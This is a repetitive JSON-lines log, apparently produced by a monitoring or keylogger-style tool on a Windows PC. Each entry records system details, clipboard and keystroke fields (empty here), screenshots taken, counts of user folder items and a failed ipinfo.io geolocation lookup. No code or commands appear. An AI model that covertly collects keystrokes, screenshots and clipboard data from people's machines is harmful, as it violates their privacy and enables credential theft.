{"timestamp": "2025-06-14T08:34:51.434733+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9a2b30d24c8fb56bea9eb0ba1ff6b9a8c8beb36aa206bdf05b0075afa0f38f65", "_raw_log_hash": "cd40a2840173826fa89e1afecab04095a53b99a34d8fefedefbec3db4a431739"}
{"timestamp": "2025-06-14T08:35:05.011465+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "58944ab2205f1393f8d9dfa0d2fe84b824a7fc48e373c80cc8a1f878eb258f34", "_raw_log_hash": "162052bf5e2a2f88ccf4dfb7dd40a145ffcc0bf22f7dc1d260e8583ad4dc5c5e"}
{"timestamp": "2025-06-14T08:35:18.578556+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9d947c8f741d1b6bb05c148259d3d3675a37ce4153a0442de878edda4f1cb257", "_raw_log_hash": "9660d0f5c38355560770501f3f076c887a73e4f2aa14055b7fe2dd998fa5120b"}
{"timestamp": "2025-06-14T08:35:32.138060+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "645f1fe697495f6f5dcb5f95fe099ce17a35c7307e82d02b83ce4239682e9e59", "_raw_log_hash": "fd0e9a5e20e11ac7b66b8d899b8f66ef06ac002a480950489a89b149525e2a83"}
{"timestamp": "2025-06-14T08:35:45.685411+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d38edd7c37ac5493c342c4831f73de0afeb8f7673c1d9d19f450f7d0c66f90bc", "_raw_log_hash": "a4006ae84752d31ff8a2d94164c8d47bee24ea054288a7cc8d9a1ffaa1371cda"}
{"timestamp": "2025-06-14T08:35:59.291843+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "614728dfb4c57c71685c50c34b4de2b72377b790ba3cc2a6579883a146390318", "_raw_log_hash": "a0b1b3c425d76ff4eea007ecc1a3bdf3a5c38740020c1bf13871e7f0f7dffbd6"}
{"timestamp": "2025-06-14T08:36:12.881025+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3b479714688518a28f2e0c0c1e17559be634cd3493786fa4bcf4aebdc4fe001f", "_raw_log_hash": "cf1130fa1a291cb9067b6d2407e10d3c61ee760af343ea81be619811ce964cf2"}
{"timestamp": "2025-06-14T08:36:26.441469+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3be675eec908ae27f2cf2057fa2c3ff8481c789e6f5aef42838758b7a6756d9f", "_raw_log_hash": "b3e59047a002abad31d31853f29ac3005311e19b60bae3630b83aebd8b21f9e0"}
{"timestamp": "2025-06-14T08:36:39.960807+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f1ff53a1a4829a8608e86291df455ec87e8b0b448daa3b3800fa50f947b6ded4", "_raw_log_hash": "34385bf6bc4cc04c64d68ad57400dc7ebdcc423912d8ee3727135f03afeda341"}
{"timestamp": "2025-06-14T08:36:53.575908+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a97ba76c1f92b70b0d9fbca60f8bf902b331c7b6d9c70957aca8f3e25b2cf11f", "_raw_log_hash": "86d0dee652a5844aa610960be263388b3cbe9ad9b885c71795bd7eea2fbfa745"}
{"timestamp": "2025-06-14T08:37:07.120972+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fb4524cd68074ac4b7472a9a4eebc00d53e3dd3a64dbc124cc983eb873fe8687", "_raw_log_hash": "66f80bff9b7c528151c8bdf1eca47c43f19ac5eb41c980a574cb606840576372"}
{"timestamp": "2025-06-14T08:37:20.688115+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d66dc4969b33e4d229ae0710796776f5c131961249c85430619ae0e560070578", "_raw_log_hash": "a363d9f9e375906e4d36556f12389390346bdf76ec501dc1d56006d37b043e00"}
{"timestamp": "2025-06-14T08:37:34.323988+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "51a1232426992026d8f0485701d53baf4b5c6feddd82340251f0f52349ccb3bc", "_raw_log_hash": "7453a64a2652d4b8f1c51febd79f4b5137c5d21dd139824732134f8b63ee479d"}
{"timestamp": "2025-06-14T08:37:47.962948+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "32fc9d82f3686ff6c64735c817746f11a93788d29093887f116e3dfab8096d95", "_raw_log_hash": "21da12509caf9d332a91edc3bcf08f2a79e2080bd08514df8ef489d62069f653"}
{"timestamp": "2025-06-14T08:38:01.572271+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2280abb822515e2dea5df54613afb55df382614195e3daa7e491adbc3ac6b216", "_raw_log_hash": "ee1a87396d01bd59c9bba32f893f06d476de03e10d0306c88281f75113399788"}
{"timestamp": "2025-06-14T08:38:15.324724+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ce8905e9d9bf1c612b341c40f07626fec2f1115d97ae3d3ed26185dc9e9ebdf7", "_raw_log_hash": "1ca56960611bf7b19b52598aba6a330dd7609cbe65d13d7a5f37b5e0fd4ae96b"}
{"timestamp": "2025-06-14T08:38:28.916496+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b503360f7c80ea18e3b1a38f502cd4da25cdc5a66cb0c6e772e5d4a4db427c84", "_raw_log_hash": "c3d074cacc229235ea2cfae72577a8042a8b2f31729b2eab8eaeeeba4a51c62d"}
{"timestamp": "2025-06-14T08:38:42.507192+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "69fcc85c4308ced96b0b15c269314aa963f4c6f7edfe38d94a18db98a8e3cc0f", "_raw_log_hash": "2b66f56196444c19546dbc91a12ff170b1b4de84c2ba7c08d29c343deb32c5b3"}
{"timestamp": "2025-06-14T08:38:56.098912+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b7e31fe559a2af80e76ec8cdd1b2399d3eb9619d7c9e0db9af4d6f03fd2e277b", "_raw_log_hash": "70e2972a03856490e161ffed113ae16b8e246176c19075eebc07a70200b20f6e"}
{"timestamp": "2025-06-14T08:39:09.822160+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "000f6d448d199b59ae5858120b26ac79d95f6a811e83c7ab39264abf17ad24a7", "_raw_log_hash": "858dc38a3aa9f384f7e43972920e6aa3dffe4e867169633012ad1f2b59b98568"}
{"timestamp": "2025-06-14T08:39:23.574297+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6c51d84219e5531fbc2312dcc7b745dbe1c86d8c5a7b12a2123b54a40114819b", "_raw_log_hash": "8361782f57196f8a15bdaef5d439e77b672c8af032fdd5b85ce3060d332de333"}
{"timestamp": "2025-06-14T08:39:37.079481+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0f4717be8cdc40f3f5483e69b07c0683f6f0d17ae04e97b690d3a1af08899890", "_raw_log_hash": "faad64bd039666de00d7693300a4e43bea1f90218879dd82e81205b6cf1ef66b"}
{"timestamp": "2025-06-14T08:39:50.721987+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "43bd69605fd8d8efa85c783c26d8aa49f96c1b53e5e057599640d54ebd592ab4", "_raw_log_hash": "5c841627ca002a63735dbcc33cdffdd696d45e0eda5858d546c389abef602ecf"}
{"timestamp": "2025-06-14T08:40:04.415837+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a446ce32f2532d061dfd387a6f5f19ddacef0d11f2048759a769c148bc50fb27", "_raw_log_hash": "5c384cda7e2853246b38f48cae070ce96342334278c991dee4258960a0606ef2"}
{"timestamp": "2025-06-14T08:40:18.033285+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "49541f93d926c2a1c8057481b75ea58c8e191824ac6c624c6bbe9378d509c051", "_raw_log_hash": "50e45b920c9f38f9613e3c87c2e961f88f2580481cc32183191d5179c04566db"}
{"timestamp": "2025-06-14T08:40:31.844193+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2d8819646bb945ea04576f87c18a75b9b920817916ab3061489ba2a85fda0295", "_raw_log_hash": "14c3f69e9c695293bb6f2c164c81dff204e6831df7dadffae7002ab199c45002"}
